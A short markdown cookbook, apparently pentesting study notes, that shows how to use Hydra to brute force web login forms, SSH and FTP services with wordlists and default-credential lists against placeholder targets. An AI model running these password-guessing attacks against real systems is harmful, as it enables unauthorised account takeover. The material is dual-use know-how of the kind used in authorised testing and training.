# Brute Forcing Tools

Using various brute forcing tools to break into various authentication systems is an important skill. He's a basic cookbook detailing a few tools you can use today.

## Hydra

### Install on Kali

```
sudo apt install hydra
```

### Hydra with default credentials

```
hydra -C /opt/useful/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <TARGET IP> -s <TARGET PORT> http-get /
```
*Note that this uses a combined list, meaning the credentials in are structured like user:password*

### Hydra with wordlists

```
hydra -L wl.txt -P wl.txt -u -f <TARGET IP> -s <TARGET PORT> http-get /
```
*Note that the -L and -P flags indicate a wordlist. To only brute force the admin user, use "-l admin". The same is true with passwords with the -p flag.*

### Attacking a http-post-form

This command can be used to attack common login prompts on the web. It also uses fail strings to inform the brute forcing tool if they have been successful or unsuccessful in their login. In this case, it checks if the login form is still there and if it is, the current username and password being iterated through is a failure.

```
hydra -L wl.txt -P wl.txt -u -f <TARGET IP> -s <TARGET PORT> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```
*Be sure to double check your parameters and fail string. To find them, send in a test login, then check the network tab in inspect element and copy the response as a curl command.*

### Attacking services

```
hydra -L wl.txt -P wl.txt -u -f ssh://<TARGET IP>:<TARGET PORT> -t 4
hydra -L wl.txt -P wl.txt -u -f ftp://<TARGET IP>:<TARGET PORT>
```

*Note that -t 4 limits the threads of the brute forcing attack so it plays nice with ssh*
